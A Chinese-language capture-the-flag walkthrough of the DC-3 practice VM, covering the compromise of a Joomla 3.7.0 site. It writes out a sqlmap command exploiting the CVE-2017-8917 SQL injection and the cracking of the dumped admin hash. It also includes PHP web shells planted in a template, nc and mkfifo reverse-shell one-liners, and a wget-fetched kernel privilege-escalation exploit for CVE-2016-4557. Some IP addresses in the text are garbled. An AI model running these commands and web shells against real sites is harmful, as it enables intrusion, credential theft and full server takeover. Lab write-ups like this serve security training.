# 前期-信息收集

开始进行 IP 探活

```

nmap -sP 192.168.112.0/24
```

![](../Images/18ae7607312d358012917e7183421288.png)

排除法,去掉自己、宿主机、网关

`192.168.112.152` 就是目标了

扫描开放端口

```

nmap -T5 -A -v -p- 192.168.112.152
```

![](../Images/18ae7607312d358012917e7183421288.png)

发现只开放一个 80 端口,那么就只能从这入手了

访问 web 发现，是一个 joomla 网站

![](../Images/675c8cf55e52aef31be37d5478352341.png)![](../Images/3d8b1d44d02f528169b49f3de6ecb035.png)

dirMap 目录扫描看看

```

python3 dirmap.py -i http://192.168.112.152/ -lcf
```

![](../Images/e2c9dcda5a49bf46bf55e3ca235df0cc.png)

# 中期-漏洞利用

使用 searchsploit 找找这个版本的漏洞

```

searchsploit -w Joomla 3.7.0
```

![](../Images/0f9b2012022881d80ed99c769c752a23.png)

Joomla 3.7.0 有个 CVE-2017-8917 SQL 注入漏洞

更多漏洞信息和 POC 见 BS-Exploits

直接 SQLMAP 走起

```
sqlmap -u "http://192.168.112.152/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb --tables -T '#__users'
 -C name,password --dump --batch
```

可以看到跑出了后台账号密码

![](../Images/d893319f2f9de292a7c968ec1d7de2f1.png)

```

 admin | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

密码是 bcrypt 加密的, hashcat 和 john

都可以跑,在 DC1 中使用 hashcat 跑了密码

这里就用 john 跑一跑

```
echo "\$2y\$10\$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu"

 > hash.txt
```

![](../Images/2ec3a3ce5112a619aa1c0a177780ade3.png)

ok,跑出密码 `snoopy` 

登录前再扫一下后台目录

![](../Images/2c62420eccd86dc8e7f40cc73a5a58a4.png)

注意不是在 `http://192.168.192.168.112.152/index.php` 登录，

而是在 `http://192.168.192.168.112.152/administrator/index.php` 登录

这 TM 才是后台

![](../Images/dc44b66dd277d0f1e029ace4bbc63f4a.png)

是时候拿个 shell 玩玩了

我们可以编辑模板来获得一个反向 shell

访问 `http://192.168.112.152/administrator/index.php?option=com_templates&view=templates`

![](../Images/357ba3c04c85f5fe755e9f4c18f75e0a.png)

这里随便找一个模板，我就用 Beez3 了

看它不爽到 index.php 里加点代码

```
system($_GET['cmd'
]);
```

![](../Images/bd2b28e89d7c64866062a2d873505d5f.png)

尝试访问模板预览 

`http://192.168.112.152/index.php?tp=1&templateStyle=4&cmd=whoami`

![](../Images/66ce2fcdf11ea6e84e44af356f28dee4.png)

ok，命令成功执行，下面直接准备回弹 shell

kali 开启监听

```

nc -lvp 4444
```

访问 `http://192.168.112.152/index.php?tp=1&templateStyle=4&cmd=nc%20-nv%20192.168.141.134%204444%20-e%20/bin/bash`

等待了半天,没弹回来,什么鬼,换个回弹方法试试

注: 这里试了半天,用了很多方法都没有回弹成功,只好暂时另辟蹊径了

到 index.php 里加个一句话

```
<?php eval($_POST[1]);?>

```

![](../Images/08a4b6bd4ea639b39d0837dd17d43f07.png)

使用蚁剑连接

![](../Images/e30ca956a112f0a3de435027ed0c4eda.png)

连上去了,手动在弹个 shell 回来

```

nc -nv 192.168.112.152 4444 -e /bin/bash
```

![](../Images/fb07f533bd6a11c37c71f725a258b84a.png)

CNM还是不行谜题解开了

这 TM 是 openbad版本的 nc 

我不管老子就是要弹

![](../Images/403a8d3be0e02e3ac56d232432111e8c.png)

```

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.112.152 4444 >/tmp/f
```

![](../Images/d0073751745b882cf65bfe8acbb51889.png)

狗日的，还不是被我连上了,改下交互,查看版本

lsb_release -a

# 后期-提权

使用 searchsploit 找找这个版本的漏洞

```

searchsploit -w ubuntu 16.04 4.4.x
```

![](../Images/a0ce088335a5fc05ff3127c845f91216.png)

存在提权漏洞 CVE-2016-4557

![](../Images/c1115106e7e77e25482b650afad5e500.png)

找个 EXP 用用

```


apt install -y libfuse-dev
```

EXP 传给靶机,kali 启个 web

```

python -m http.server 80
```

靶机上下载,并运行

```


wget 192.168.112.152/39772.zip
```

![](../Images/d6f333c4f93e865ea6e9866f775f0935.png)

提权成功,感谢靶机作者 **@DCUA7**,查看最终 flag。
